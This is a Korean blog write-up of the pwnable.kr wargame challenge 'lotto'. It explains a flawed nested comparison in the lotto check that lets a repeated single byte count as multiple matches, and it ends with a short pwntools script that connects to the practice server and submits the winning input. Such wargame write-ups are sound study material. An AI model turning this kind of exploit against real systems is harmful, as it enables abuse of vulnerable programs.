---
layout: post
title:  "13. lotto"
subtitle: ""
date:   2018-11-05 16:55:13 +0900
categories: security
tags : pwnable
---


![1]({{"/assets/img/security/pwnable/13/1.png" | absolute_url}})

로또 프로그램이란다

<br>

![2]({{"/assets/img/security/pwnable/13/2.png" | absolute_url}})

바로 코드를 봤고

`play()` 함수만 보면 된다.

<br>

![3]({{"/assets/img/security/pwnable/13/3.png" | absolute_url}})

난수를 발생시켜 로또 숫자를 생성한다.


<br>
![4]({{"/assets/img/security/pwnable/13/4.png" | absolute_url}})

생성한 로또 번호를 모듈러 연산으로 1~45의 값만 가지게 하는데

<br>
![5]({{"/assets/img/security/pwnable/13/5.png" | absolute_url}})

유저가 키보드로 입력할 수 있는 값은 `33("!")`부터다..

1~ 32는 키보드로 입력할 수 없는 값인데..

어떻게 맞추나 했는데 로또 숫자 조건 검사식이 조금 이상하다.

<br>

![6]({{"/assets/img/security/pwnable/13/6.png" | absolute_url}})

`lotto[i] == submit[j]`

i.. j...

로또의 각 숫자를 제출한 6자리의 각 숫자와 비교하고..

맞을 경우 match가 증가한다.

제출을 같은 숫자 6자리로 제출하고...

로또의 6자리 수 중 하나라도 맞추면 정답인데..

경우의 수가 엄청 많아보이지만.. 넣을 수 있는 값인 `33("!")`을 반복해서 넣어서 일단 시도해봤다.

<br>
![7]({{"/assets/img/security/pwnable/13/7.png" | absolute_url}})

--------
### pwntools

{% highlight python %}
from pwn import *
 
id   = 'lotto'
host = 'pwnable.kr'
port = 2222
pw   = 'guest'
s = ssh(id, host, port=port, password=pw)
 
res = s.run('./lotto')
res.recvuntil('Exit')
res.sendline('1')
res.recvuntil(':')
res.sendline('!!!!!!')
res.interactive()
{% endhighlight %}